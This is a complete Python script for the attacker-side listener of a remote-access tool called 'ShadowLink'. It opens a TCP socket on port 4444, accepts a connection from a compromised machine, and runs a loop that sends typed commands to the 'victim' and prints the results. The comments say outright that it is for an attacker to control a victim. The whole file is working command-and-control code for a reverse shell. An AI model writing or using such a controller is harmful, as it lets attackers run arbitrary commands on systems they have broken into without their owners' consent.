import socket
import os

# --- CONFIGURATION ---
SERVER_IP = "0.0.0.0"  # Listen on all interfaces
PORT = 4444

def start_server():
    # 1. Create Socket (IPv4, TCP)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # 2. Bind to Port
    # (setsockopt allows us to reuse the port immediately if we restart)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((SERVER_IP, PORT))
    
    # 3. Listen
    s.listen(1)
    print(f"[*] ShadowLink Server listening on port {PORT}...")
    
    # 4. Accept Connection
    client_socket, client_address = s.accept()
    print(f"[+] CONNECTION ESTABLISHED: {client_address[0]}")
    
    # 5. The Command Loop
    while True:
        try:
            # Get command from attacker
            command = input(f"ShadowLink@{client_address[0]}> ")
            
            if not command.strip():
                continue # Ignore empty enters
            
            if command.lower() == 'exit':
                client_socket.send('exit'.encode())
                break
            
            # Send command to victim
            client_socket.send(command.encode())
            
            # Receive response (Increase buffer size for large outputs)
            output = client_socket.recv(1024 * 128).decode()
            print(output)
            
        except Exception as e:
            print(f"[-] Connection Error: {e}")
            break

    client_socket.close()
    s.close()

if __name__ == "__main__":
    start_server()